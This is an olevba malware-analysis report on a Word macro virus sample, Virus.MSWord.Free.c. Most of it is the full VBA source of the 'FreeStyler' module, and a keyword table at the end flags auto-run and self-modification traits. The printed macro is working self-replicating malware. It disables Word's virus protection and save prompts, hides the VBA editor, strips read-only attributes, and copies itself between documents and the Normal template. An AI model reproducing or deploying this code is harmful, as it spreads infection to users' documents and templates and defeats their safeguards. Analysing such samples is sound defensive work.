olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Free.c-c5df2579a3c346b6f07c527af77f6c48c4d287ee
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO FreeStyler.cls 
in file: Virus.MSWord.Free.c-c5df2579a3c346b6f07c527af77f6c48c4d287ee - OLE stream: 'Macros/VBA/FreeStyler'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_New()
On Error Resume Next
'VOVAN//SMF
Application.EnableCancelKey = 0: Application.ShowVisualBasicEditor = 0
B = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1)
C = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
xxx = Mid(B, 13): fff = Len(xxx) - 2: hhh = Left(xxx, fff)
Number = MacroContainer.VBProject.VBComponents(1).CodeModule.ProcCountLines(hhh, vbext_pk_Proc)
VV = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(1, Number)
With MacroContainer.VBProject.VBComponents.Item(1).CodeModule
.DeleteLines 1, Number
.InsertLines C, VV
End With
End Sub
        Sub View()
        Document_New
        End Sub
Private Sub Document_Close()
On Error Resume Next
If ActiveDocument.Name = ActiveDocument.FullName Then Document_New: End
If ActiveDocument.Saved = True Then Call Document_Open Else End
End Sub
        Sub Macro()
        Document_New
        End Sub
Private Sub Document_Open()
On Error Resume Next
Application.EnableCancelKey = 0: Application.ShowVisualBasicEditor = 0
Options.VirusProtection = 0: Options.SaveNormalPrompt = 0
ActiveDocument.ReadOnlyRecommended = 0: Application.ScreenUpdating = 0
Document_New
If ActiveDocument.ReadOnly = 1 Then
SetAttr ActiveDocument.FullName, 0
ActiveDocument.Reload
End If
If NormalTemplate.VBProject.VBComponents.Item(1).Name = "FreeStyler" Then DOT = True
If ActiveDocument.VBProject.VBComponents.Item(1).Name = "FreeStyler" Then DOC = True
If DOT = True And DOC = True Then GoTo 1
If DOT = False Then
Set Acti = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
m = Acti.ProcBodyLine("Macro", vbext_ProcKind)
Acti.replaceline m, "        Sub ToolsMacro()"
a = Acti.ProcBodyLine("View", vbext_ProcKind)
Acti.replaceline a, "        Sub ViewVBcode()"
VV = Acti.Lines(1, FreeStyler.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
With NormalTemplate.VBProject.VBComponents.Item(1).CodeModule: .DeleteLines 1, .CountOfLines: .AddFromString VV: End With
NormalTemplate.VBProject.VBComponents.Item(1).Name = "FreeStyler"
m = Acti.ProcBodyLine("ToolsMacro", vbext_ProcKind)
Acti.replaceline m, "        Sub Macro()"
a = Acti.ProcBodyLine("ViewVBcode", vbext_ProcKind)
Acti.replaceline a, "        Sub View()"
End If
If DOC = False Then
Set Norma = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
m = Norma.ProcBodyLine("ToolsMacro", vbext_ProcKind)
Norma.replaceline m, "        Sub Macro()"
a = Norma.ProcBodyLine("ViewVBcode", vbext_ProcKind)
Norma.replaceline a, "        Sub View()"
CC = FreeStyler.VBProject.VBComponents.Item(1).CodeModule.Lines(1, FreeStyler.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule: .DeleteLines 1, .CountOfLines: .AddFromString CC: End With
ActiveDocument.VBProject.VBComponents.Item(1).Name = "FreeStyler"
m = Norma.ProcBodyLine("Macro", vbext_ProcKind)
Norma.replaceline m, "        Sub ToolsMacro()"
a = Norma.ProcBodyLine("View", vbext_ProcKind)
Norma.replaceline a, "        Sub ViewVBcode()"
Document_New
End If
If ActiveDocument.FullName = wdOpenFormatDocument Then ActiveDocument.SaveAs ActiveDocument.FullName
1: ActiveDocument.Saved = True
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

